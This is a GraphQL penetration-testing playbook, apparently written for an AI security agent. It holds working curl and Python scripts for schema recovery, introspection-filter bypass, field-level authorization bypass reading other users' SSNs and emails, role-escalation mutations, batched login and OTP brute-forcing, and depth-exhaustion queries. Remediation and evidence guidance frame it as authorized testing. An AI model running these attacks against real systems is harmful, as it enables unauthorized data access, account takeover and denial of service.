---
name: graphql-and-hidden-parameters
description: >-
  GraphQL and hidden parameter testing playbook. Use when GraphQL exists or when
  REST documentation suggests optional, deprecated, or undocumented fields. Covers
  schema recovery when introspection is disabled, field-suggestion mining, alias and
  batching abuse, depth and complexity attacks, authorization gaps at field level,
  and the evidence required to report each class distinctly.
---

# SKILL: GraphQL and Hidden Parameters — Schema Recovery, Batching, and Undocumented Fields

> **AI LOAD INSTRUCTION**: GraphQL rewards a specific mental shift: **one endpoint, many
> resolvers, and authorization applied per-resolver rather than per-route.** A gateway that
> authenticates the request authorizes nothing about the fields inside it. The attack surface
> is not the URL — it is the schema graph. When introspection is off (the modern default) you
> are doing schema *recovery*, not schema reading, and the techniques are different.
> Distinguish three separate findings — schema exposure, field-level authz bypass, and
> resource exhaustion — because they have different severities and different fixes.

## 0. RELATED ROUTING

- [graphql-exploitation-chains](../graphql-exploitation-chains/SKILL.md) — the long-form companion; load alongside this file
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) — endpoint discovery and JS bundle mining
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) — object-level authz inside arguments
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) — batching against auth and rate limits
- [attack-graphql](../attack-graphql/SKILL.md) — the phase-based methodology variant
- [prototype-pollution](../prototype-pollution/SKILL.md) — when input objects reach server-side merging
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — separating the three finding classes cleanly

---

## 1. FINDING THE ENDPOINT AND ESTABLISHING IT IS GRAPHQL

You cannot assume `/graphql`. Endpoints are commonly hidden, versioned, or split per client.

**Probe set:**

```text
/graphql          /api/graphql        /v1/graphql        /graphql/v1
/gql              /api/gql            /query             /api/query
/graphql/console  /graphiql           /playground        /altair
/api/v1/graphql   /graphql/private    /internal/graphql
```

**Fingerprint with a POST.** GraphQL always answers a well-formed query, even when unauthorized:

```bash
curl -s -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# {"data":{"__typename":"Query"}}  → confirmed GraphQL
```

**Method quirks worth testing — they bypass different middleware:**

| Method | Note |
|---|---|
| `POST` JSON | the standard; most middleware sees this |
| `GET` with `?query=` | frequently enabled; **often skips CSRF middleware** |
| `POST` `application/graphql` | raw body, a different parser path |
| `POST` form-encoded | bypasses body-size and JSON limits |
| WebSocket (`graphql-ws`) | escapes HTTP-layer rate limits entirely |

**The `GET` variant is the highest-value quirk.** If queries work via GET, the endpoint may
accept a cross-site request with no preflight — turning a read-only schema into a
CSRF-reachable data-exfiltration surface.

---

## 2. SCHEMA RECOVERY WHEN INTROSPECTION IS DISABLED

Introspection disabled means `__schema` is blocked. It does **not** mean the schema is secret.

### 2.1 Full introspection — always try first

```graphql
query IntrospectionQuery { __schema { queryType{name} mutationType{name} types{ name kind fields{ name args{name type{name kind ofType{name}}} } } } }
```

Or the abbreviated form that many weak filters miss:

```graphql
{ __schema { types { name } } }
{ __type(name:"User") { fields { name } } }
```

**Filter-aware bypasses** — filters usually match on the literal string, so encoding evades them:

```graphql
{ __schema { types { name } } }
{  __schema  {  types  {  name  }  } }
{ __schema\t{ types { name } } }
query{x:__schema{y:types{z:name}}}
{ __schema @skip(if:false) { types { name } } }
```

Also try the `__type` probe directly for likely names — it leaks field-by-field:

```graphql
{ __type(name:"User") { name fields { name type { name } } } }
{ __type(name:"Query") { fields { name } } }
{ __type(name:"Mutation") { fields { name } } }
```

### 2.2 Field suggestions — the highest-signal recovery technique

When you send an **invalid** field, most GraphQL servers reply with a suggestion. That is an
oracle: it confirms a real field exists and usually reveals near-misses.

```graphql
{ user { role } }
# → "Cannot query field \"role\" on type \"User\". Did you mean \"roles\"?"
```

**Systematic mining:** iterate over a candidate wordlist, one field per request, and harvest
the suggestions. A few hundred probes typically reconstruct most of the user-facing schema.
This is the single most effective technique against introspection-disabled servers.

```graphql
{ u }
{ us }
{ user { r } }
{ user { ro } }
```

### 2.3 Error-message leakage

GraphQL errors are verbose by default. Disable the first error to see the shape:

| Leaked | Why it matters |
|---|---|
| type and field names | direct schema fragments |
| resolver stack traces | framework, ORM, file paths |
| SQL fragments | moves you to injection testing |
| internal hostnames | infrastructure mapping |
| "did you mean" suggestions | schema oracle (above) |

### 2.4 Clients as the schema source

Frequently faster than attacking the server:

| Source | What to extract |
|---|---|
| JS bundles | full query strings with field names and arguments |
| source maps (`.js.map`) | original operation names, server-side field lists |
| mobile app bundles | the *mobile* schema, often a superset of web |
| Apollo / Relay persisted queries | a complete operation manifest |
| CDN or BFF config | backend schema routing |
| `/graphql/schema.json` | sometimes served directly |

```bash
curl -s https://target/app.js | grep -oE '(query|mutation) [A-Za-z]+[^{]*\{[^}]*\}' | head -50
curl -s https://target/app.js.map | jq -r '.sourcesContent[]?' 2>/dev/null | grep -i graphql
```

**Mobile bundles are the recurring win.** Mobile clients frequently talk to a different
GraphQL endpoint carrying fields the web client never requests — including admin-shaped ones.

---

## 3. FIELD-LEVEL AUTHORIZATION — THE CORE CLASS

The request is authenticated. Individual resolvers fail to check whether *this* subject may
read *this* field or object. This is to GraphQL what BOLA is to REST, and it is the most
commonly exploitable class here.

**The canonical read bypass:** a field is hidden in the UI but present in the schema.

```graphql
{ user(id:"<other-user-id>") { email phone ssn role permissions } }
```

**The canonical write bypass:** a mutation accepts a field the client never sends.

```graphql
mutation { updateUser(id:"5", input:{ role:"admin" }) { id role } }
mutation { updateProfile(input:{ userId:"1", verified:true }) { ok } }
```

**Where the gap concentrates:**

| Pattern | Why the check is missing |
|---|---|
| nested object field | the parent resolver checks ownership; the child resolver does not |
| alias-duplicated field | each alias resolves independently — the check may run once |
| interface / union field | the concrete type's check is easy to omit |
| deprecated field | marked deprecated, still fully resolvable |
| `node(id:)` relay pattern | global ID lookup skips the ownership check |
| mutation returning a type | the return resolver is often unchecked |

**Aliases are the force multiplier** and deserve their own note. One request can carry
hundreds of aliases, each resolving independently:

```graphql
{
  a1: user(id:"1"){email}
  a2: user(id:"2"){email}
  a3: user(id:"3"){email}
}
```

If the authorization check runs per *request* rather than per *resolver*, the first resolves
and the rest ride along. If it runs per resolver but a rate limiter counts requests, hundreds
of object reads cost one request — see §4.

---

## 4. BATCHING, ALIASING, AND RATE-LIMIT COLLAPSE

GraphQL's design lets one HTTP request perform unbounded work. This breaks every control that
counts requests rather than operations.

**(a) Alias batching** — N logical operations, one HTTP request:

```graphql
{ a1: login(user:"admin",pass:"p1"){token}  a2: login(user:"admin",pass:"p2"){token} }
```

Against login, OTP, or password-reset this defeats request-based rate limits and account
lockout — the classic **OTP brute-force via batching** finding.

**(b) Array / query batching** — the transport-level variant:

```json
[
  {"query":"mutation{login(u:\"admin\",p:\"1\"){token}}"},
  {"query":"mutation{login(u:\"admin\",p:\"2\"){token}}"}
]
```

Send as a JSON array to the same endpoint. Server support varies; when supported, the same
rate-limit collapse applies. **Test both — alias and array batching are independent features**
and a target often enables the one you did not try.

**(c) Depth and complexity attacks** — resource exhaustion via self-referential schema:

```graphql
{ user { friends { friends { friends { friends { friends { name } } } } } } }
```

| Attack | Shape | Effect |
|---|---|---|
| deep nesting | recursive type chain | CPU/memory exhaustion |
| wide aliasing | thousands of aliases | single-request DoS |
| cyclic query | `user → org → user → …` | infinite resolution |
| large `first:`/`limit:` | `posts(first:999999)` | DB / memory pressure |
| directive stacking | `@include(if:true)` repeated | amplification |

**Report exhaustion separately from data exposure.** They are different findings with
different severities — a depth-limit gap is a low-to-medium availability issue, not a data
breach. Conflating them weakens both.

---

## 5. HIDDEN AND UNDOCUMENTED PARAMETERS

Applies to both REST and GraphQL. The premise: **the UI is not the API contract.** The
contract is whatever the resolver or handler accepts.

| Source of hidden parameters | Technique |
|---|---|
| admin docs vs public docs | diff the two OpenAPI specs |
| `additionalProperties: true` | the schema *tells* you extra fields are accepted |
| deprecated / legacy versions | compare `/api/v1` against `/api/v2` request schemas |
| frontend requests richer than UI | watch the network tab during admin flows |
| mobile endpoints | often carry tenancy, role, and feature-flag fields |
| debug / verbose modes | error messages naming the expected field |
| GraphQL type definitions | every field is an accepted argument somewhere |

**High-yield parameter names to inject opportunistically:**

```text
role  roles  is_admin  isAdmin  admin  permission  permissions
org  org_id  tenant  tenant_id  workspace  workspace_id
verified  email_verified  active  enabled  approved
plan  tier  credits  balance  limit  quota
owner  owner_id  user_id  created_by  internal  debug  test
feature_flag  beta  preview  bypass  privileged  superuser
```

**The systematic method:** capture the *legitimate* request as a low-privilege user, capture
the *admin* request for the same resource, and diff the two bodies. Every field the admin
sends that the user does not is a mass-assignment candidate. Then replay the user's request
with those fields added and read back — see [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) §4.

---

## 6. EVIDENCE STANDARD

Three findings may emerge. Report them separately with distinct evidence.

| Finding class | Required evidence |
|---|---|
| **Schema exposure** | the introspection/suggestion request and the returned type or field names; state whether introspection was nominally disabled |
| **Field-level authz bypass** | two identities; the field hidden from the low-privilege role; the response containing it; read-back proof for mutations |
| **Resource exhaustion** | the exact query, its cost (depth/aliases/`first:`), the measured effect, and comparison against a baseline request |
| **Rate-limit collapse (batching)** | the batching request, the number of logical operations executed, and proof the control was absent or per-request |

| Item | Why |
|---|---|
| full request including operation name and variables | the operation, not the URL, is the payload |
| response with `data` and `errors` both shown | errors carry the schema leakage |
| the two identities and their roles (authz findings) | proves a differential |
| server response revealing limits — or their absence | establishes the control gap, not just the attack |
| exact endpoint and transport (POST/GET/WS, batching form) | reproducibility; these differ per path |
| a benign control query showing normal behaviour | proves the anomaly is the finding |

**Quote the "did you mean" suggestion verbatim.** For schema-recovery findings, the server's
own words are the proof that the field exists — stronger than any inference you draw.

---

## 7. REMEDIATION REFERENCE

1. **Disable introspection in production** — a server setting, not a substitute for per-field authorization. Treat it as defence in depth, never as the control.
2. **Authorize in the resolver, per field and per object** — the gateway authenticates; it does not authorize. Every resolver that returns sensitive data or accepts a mutation must check the subject's relationship to the object.
3. **Disable error suggestions and stack traces** — field suggestions are a schema oracle. Return a generic error with a correlation ID.
4. **Cap query depth, complexity, and alias count** — enforce a computed cost budget per operation, reject above threshold, and apply it *before* execution. Depth limits alone do not stop wide aliasing; alias limits alone do not stop deep nesting.
5. **Rate-limit by operation, not by request** — count logical operations after parsing. Otherwise batching defeats the limit. Apply dedicated limits to authentication, OTP, and password-reset mutations.
6. **Disable or restrict array batching** — if the client does not need it, turn it off; if it does, cap batch size and charge each entry against the rate limit.
7. **Apply CSRF protection to the GraphQL endpoint** — including the `GET` path and content types other than JSON. Do not exempt the endpoint because "it is an API."
8. **Treat persisted queries as an allowlist** — accept only registered operation IDs in production. This eliminates arbitrary query shape, hidden fields, and unbounded complexity in one control.
9. **Diff client and server schemas in CI** — a test that fails when a field becomes resolvable without a corresponding policy entry catches the common regression where a new admin field ships with no authorization.

---

## 8. EXECUTION PRIMITIVES

GraphQL findings are proven by **a query returning data or performing an action the caller is not
entitled to**. Introspection is a lead; a resolver that returns another user's data is the finding.

### 8.1 Establish the endpoint and its transport

```bash
T="https://target.tld"
for P in /graphql /api/graphql /v1/graphql /graphql/v1 /query /gql /api/gql /graphql/console; do
  R=$(curl -sS -o /tmp/g -w '%{http_code} %{size_download} %{content_type}' -X POST "$T$P" \
        -H 'Content-Type: application/json' -d '{"query":"{__typename}"}')
  printf '%-24s %s  %s\n' "$P" "$R" "$(head -c 60 /tmp/g | tr -d '\n')"
done
# GET is often enabled, and it changes which controls apply
curl -sS -o /tmp/gg -w 'GET %{http_code}\n' "$T/graphql?query=%7B__typename%7D"
# and batched arrays, which many rate limiters miss
curl -sS -o /tmp/gb -w 'batch %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'
```

A `200` with a JSON body containing `data` confirms the endpoint. **Test POST, GET, and batched forms
separately** - the controls are configured per transport, and the array form is the one most often
left unguarded.

### 8.2 Introspection, when it is available

```bash
curl -sS -o /tmp/schema.json -w 'introspection %{http_code} %{size_download}\n' "$T/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType{name} mutationType{name} subscriptionType{name} types { kind name fields(includeDeprecated:true){ name args{name type{kind name ofType{kind name}}} type{kind name ofType{kind name}} } inputFields{name type{kind name ofType{kind name}}} enumValues{name} } directives{name locations args{name}} } }"}'
python3 - <<'PY'
import json
d=json.load(open('/tmp/schema.json'))
t=d.get('data',{}).get('__schema',{})
print("types:",len(t.get('types',[])))
for ty in t.get('types',[]):
    if ty.get('kind')=='OBJECT' and not ty['name'].startswith('__'):
        print(ty['name'], "->", ",".join(f['name'] for f in (ty.get('fields') or []))[:160])
PY
```

A full schema is the **complete map of the data model and every field name**, which is what makes the
following tests possible. If introspection is disabled, go to 8.3.

### 8.3 Schema recovery without introspection

```bash
# 1) does it leak the suggestions? many servers answer a typo with "did you mean"
curl -sS -o /tmp/sug "$T/graphql" -H 'Content-Type: application/json' -d '{"query":"{__schema}"}'
grep -oiE 'did you mean|DidYouMean|suggestions|"message":"[^"]{0,200}"' /tmp/sug | head -5
# 2) field-name probing: a valid field changes the error, an invalid one names it
for F in user me users viewer account profile orders order payment invoices admin audit logs; do
  R=$(curl -sS -o /tmp/f -w '%{size_download}' "$T/graphql" -H 'Content-Type: application/json' \
        -d "{\"query\":\"{$F{__typename}}\"}")
  M=$(grep -oiE 'cannot query field|unknown field|field .* doesn|must not have a selection|syntax' /tmp/f | head -1)
  printf '%-12s size=%-6s %s\n' "$F" "$R" "$M"
done
# 3) the classic field-suggestion loop: exploit the error message to walk the schema
python3 - <<'PY'
import json,urllib.request
T="https://target.tld/graphql"
def ask(q):
    r=urllib.request.Request(T,json.dumps({"query":q}).encode(),{"Content-Type":"application/json"})
    try: return json.load(urllib.request.urlopen(r,timeout=10))
    except Exception as e: return {"err":str(e)}
for probe in ["{user}" "{usre}" "{userz}" "{__typename}{us}"]:
    print(probe, "->", str(ask(probe))[:180])
PY
```

The **suggestion field is a schema oracle**: submitting a near-miss field name returns the real one.
This is how you rebuild a schema when introspection is off, and it works on a large fraction of
servers.

### 8.4 Alias-based rate-limit and batching abuse

```bash
# aliases let one request perform many operations, which defeats a naive per-request limiter
python3 - <<'PY'
import json,urllib.request
a=[]
for i in range(1,101):
    a.append(f'a{i}: user(id:"{i}"){{ id email }}')
q="{"+ " ".join(a) +"}"
r=urllib.request.Request("https://target.tld/graphql",json.dumps({"query":q}).encode(),
                         {"Content-Type":"application/json","Authorization":"Bearer TOKEN"})
try:
    d=json.load(urllib.request.urlopen(r,timeout=20))
    n=len(d.get("data",{}) or {})
    print("aliases returned:", n, "of 100")
except Exception as e:
    print("error:", e)
PY
# and the array-batch form, which is a separate code path
python3 - <<'PY'
import json,urllib.request
body=[{"query":"mutation{ login(user:"a",pass:"x"){token} }"} for _ in range(500)]
r=urllib.request.Request("https://target.tld/graphql",json.dumps(body).encode(),
                         {"Content-Type":"application/json"})
try:
    resp=urllib.request.urlopen(r,timeout=30)
    print("batch status:", resp.status, "bytes:", len(resp.read()))
except Exception as e: print("error:", e)
PY
```

A request that performs **100 operations where the limiter counted 1** is the finding. Use your own
account's data (aliased reads of your own ids) rather than spraying another user's - the point is the
batching, not the data.

### 8.5 Field-level authorization: the resolver gap

```bash
# B reads an object it may legitimately see, but asks for fields it may not
A_RT="TOKEN_A"; B_RT="TOKEN_B"
Q='{ user(id:"VICTIM_ID"){ id email role phone ssn creditCard token apiKey } }'
curl -sS -o /tmp/b1 -w 'field-gap %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $B_RT" -d "{\"query\":\"$Q\"}"
python3 -c "
import json;d=json.load(open('/tmp/b1'))
print(json.dumps(d,indent=1)[:600])"
# and the same object through the list connection, which may resolve fields differently
Q2='{ users(first:50){ edges{ node{ id email role phone } } } }'
curl -sS -o /tmp/b2 -w 'list-gap  %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $B_RT" -d "{\"query\":\"$Q2\"}"
grep -c '@' /tmp/b2
```

**A field that returns data B should not see is the finding** - and it is common, because authorization
is often implemented on the top-level query and not on the node's fields. Test the same object through
every path that returns it.

### 8.6 Hidden parameter discovery

```bash
# an undocumented argument usually produces a validation error that names it
curl -sS -o /tmp/h1 -w 'baseline %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOK" -d '{"query":"{ user(id:"1"){ id } }"}'
for ARG in admin true debug verbose all includeDeleted includeArchived withSecrets internal raw fields relations; do
  R=$(curl -sS -o /tmp/h2 -w '%{size_download}' "$T/graphql" -H 'Content-Type: application/json' \
        -H "Authorization: Bearer $TOK" -d "{\"query\":\"{ user(id:\\\"1\\\"){ id {$ARG} } }\"}")
  D=$(diff <(head -c 150 /tmp/h1) <(head -c 150 /tmp/h2) >/dev/null && echo same || echo DIFF)
  printf '%-18s size=%-6s %s\n' "$ARG" "$R" "$D"
done
```

An argument that changes the response or triggers a distinct validation error **exists**. This is the
GraphQL equivalent of parameter harvesting, and it finds the debug and expansion flags that the schema
does not advertise.

### 8.7 Directives and the query-shape surface

```bash
# @skip and @include change which fields resolve, which can bypass a filter applied in the query string
curl -sS -o /tmp/d1 "$T/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:"VICTIM"){ id email @include(if:true) } }"}'
# deeply nested queries exercise depth and complexity limits
python3 - <<'PY'
import json,urllib.request
q="{ user(id:"1"){ "+ "friends{ "*6 + "id" + "}"*6 + " } }"
r=urllib.request.Request("https://target.tld/graphql",json.dumps({"query":q}).encode(),
                         {"Content-Type":"application/json"})
try: print("depth query:", urllib.request.urlopen(r,timeout=20).status)
except Exception as e: print("depth query rejected/handled:", str(e)[:120])
PY
```

**An absent depth limit is a hardening finding** - report it as such, and do not attempt to exhaust the
server on a production system.

### 8.8 Persisted queries and GET-based operations

```bash
# persisted-query mode lets a GET carry a hash; the hash is a capability and can be enumerated
curl -sS -o /tmp/pq -w 'persisted %{http_code}\n' "$T/graphql?extensions=%7B%22persistedQuery%22%3A%7B%22version%22%3A1%2C%22sha256Hash%22%3A%22HASH%22%7D%7D"
# a GET with a query string may bypass a WAF rule written for POST bodies
curl -sS -o /tmp/gq -w 'GET-query %{http_code}\n' "$T/graphql" \
  --get --data-urlencode 'query={__typename}' -H "Authorization: Bearer $TOK"
# and operationName selection, when several operations share one document
curl -sS -o /tmp/on -w 'opname %{http_code}\n' "$T/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"query A{__typename} query B{__schema{types{name}}}","operationName":"B"}'
head -c 100 /tmp/on
```

`operationName` lets you execute an operation the client never intended to expose, and GET-borne
queries frequently bypass POST-oriented controls. **Both are separate code paths worth testing.**

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the endpoint **execute queries** (a `data` key in the response)? | the service is live |
| 2 | Is the schema **recoverable** by introspection or suggestion probing? | the data model is disclosed |
| 3 | Does a query **return data B is not entitled to**? | the authorization finding |
| 4 | Does a **mutation perform an action B is not entitled to perform**? | the stronger, state-changing form |
| 5 | Did you confirm with the **three-way differential** (B->B, A->A, B->A)? | the data belonged to someone else |
| 6 | Does **aliasing or batching** perform more operations than the limiter counts? | the control bypass, measured |
| 7 | Is there a **depth or complexity limit**? | hardening posture, stated as such |

**A resolver returning another user's data is the bar.** Introspection alone is an information
disclosure of low severity; the finding is what the schema lets you reach.

---

## 10. EVIDENCE STANDARD — RESOLVER DIFFERENTIAL

| Item | Why |
|---|---|
| The **exact query or mutation** that produced the result, as a runnable document | reproducibility |
| The **response**, showing the data or the effect | the finding |
| The **three-way differential** where authorization is the issue | proves the data was another user's |
| The **schema or the recovery technique** (introspection, suggestion probing) with its output | the data model disclosure |
| For batching: the **number of operations versus the number the limiter counted**, measured | the bypass, quantified |
| The **transport used** (POST, GET, batch array) | controls are per-transport |
| **Negative control** - an invalid field returns a normal validation error | shows the service is behaving, not broken |
| For a mutation: the **read-back showing the state changed** | persistence, not a response echo |
| The **depth and complexity limits**, absent or present, with the measurement | hardening posture |
| Confirmation that no **destructive mutation** was executed | scope discipline |

Report the **query and the resolver gap**: "with user B's token, the query
`{ user(id:"1001"){ id email role phone } }` returns user A's email address and role; the same query
with A's token returns the identical object, and B's own `id:"1002"` returns B's data, so the
`user` resolver does not check ownership; the schema was obtained by introspection, which is enabled,
and it defines 214 types including a `creditCard` field on `User` that is also returned to B", never
"GraphQL introspection is enabled".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Introspection enabled with no resolver gap | a low-severity disclosure; report it precisely, not as a breach |
| A query returning only **your own** data | no boundary crossed |
| A field that exists in the schema but returns `null` for you | authorization is working |
| A suggestion-mode error with no field recovered | no disclosure |
| A depth limit that rejects your query | the control works |
| A batch that the server processed one operation at a time under a limiter | the control works |
| A `200` with an `errors` array and no `data` | the query did not succeed |
| A mutation that returned success but did not persist | verify with a read-back |
| An alias approach that the limiter counted per alias | the limiter is aware |
| A schema obtained from a public client bundle | already public |
| A "hidden" argument that had no effect on the response | it does not exist |
| A finding demonstrated only on your own test server | tests your own code |

**Read back after every mutation, and differential every read.** GraphQL's error model makes a `200` a
very weak signal.

---

## 11. REMEDIATION REFERENCE — RESOLVER AUTHORIZATION

1. **Authorize in the resolver, for every field and every object** - the pervasive gap is a guarded top-level field with an unguarded node, so authorization belongs at the point of data access, not the schema entry point.
2. **Implement field-level authorization, and omit unauthorized fields rather than nulling them** - a `null` still confirms the field exists, and field-level leaks are the class that follows a fixed BOLA.
3. **Disable introspection in production, and disable field suggestions in the error response** - suggestions rebuild the schema one field at a time, so both switches are required together.
4. **Enforce query cost analysis with a depth limit and a complexity budget** - it closes the alias, batching, and deeply-nested-query families in one control rather than one rule per shape.
5. **Count batched operations individually for rate limiting and cost** - an array of 500 mutations is 500 operations, and a per-request counter is what makes aliasing and batching effective.
6. **Disable or strictly limit the GET transport** - a query in a URL bypasses body-oriented WAF rules and lands in logs and proxies where it is easily leaked.
7. **Require persisted or allowlisted queries for public clients** - when the server only executes hashes it has seen, arbitrary query shapes are impossible.
8. **Apply the same authorization to subscriptions and mutations as to queries** - a real-time channel has no HTTP layer to inspect, and it is commonly left unchecked.
9. **Do not expose internal or administrative types in the schema** - a type that a client should never reach should not be resolvable, regardless of the resolver's checks.
10. **Log the operation name, the fields requested, and the resolver's authorization decision** - this is how a resolver gap is detected before it is reported, and it gives you the exposure window afterwards.
11. **Include a two-account differential test for GraphQL in CI** - one test per type that fetches every field with a low-privilege token detects the resolver gap and its regressions.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the REST form of the resolver gap
- [graphql-exploitation-chains](../graphql-exploitation-chains/SKILL.md) - the broader exploitation chain library
- [attack-graphql](../attack-graphql/SKILL.md) - the companion automated playbook
- [api-recon-and-docs](../api-recon-and-docs/SKILL.md) - the endpoint discovery this builds on
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - the token layer beneath the resolver decision
